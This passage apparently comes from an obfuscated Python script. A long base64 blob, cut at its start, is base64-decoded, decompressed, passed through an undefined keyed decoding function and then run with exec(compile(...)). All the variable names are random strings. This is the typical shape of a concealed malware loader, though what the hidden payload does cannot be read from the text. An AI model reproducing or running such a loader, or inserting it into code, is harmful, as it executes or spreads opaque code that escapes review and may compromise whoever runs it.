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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
